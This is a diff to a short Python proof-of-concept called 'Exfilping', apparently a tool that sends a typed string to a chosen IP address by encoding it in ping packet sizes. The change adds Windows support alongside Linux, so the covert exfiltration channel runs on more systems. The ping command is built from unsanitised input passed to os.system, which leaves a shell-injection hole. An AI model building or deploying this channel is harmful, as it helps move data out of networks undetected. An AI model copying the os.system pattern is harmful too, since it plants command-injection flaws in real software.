@@ -1,5 +1,6 @@
 import base64
 import os
+import platform
 
 def generar_diccionario_base64():
     caracteres_base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
@@ -9,12 +10,20 @@ def generar_diccionario_base64():
     return diccionario_base64
 
 def realizar_ping(direccion_ip, tamano):
-    comando_ping = f"ping -c 1 -s {tamano} {direccion_ip}"
+    sistema_operativo = platform.system().lower()
+    if sistema_operativo == "linux":
+        comando_ping = f"ping -c 1 -s {tamano} {direccion_ip}"
+    elif sistema_operativo == "windows":
+        comando_ping = f"ping -n 1 -l {tamano} {direccion_ip}"
+    else:
+        print(f"No se reconoce el sistema operativo: {sistema_operativo}")
+        return -1
+
     resultado = os.system(comando_ping)
     return resultado
 
 def main():
-    print ("Exfilping v. 0.1 - Prueba de concepto - github.com/disketteomelette")
+    print("Exfilping v. 0.1 - Prueba de concepto - github.com/disketteomelette")
     cadena = input("Ingrese la cadena a enviar: ")
     direccion_ip = input("Ingrese la dirección IP a la que enviar el mensaje: ")
     diccionario_base64 = generar_diccionario_base64()
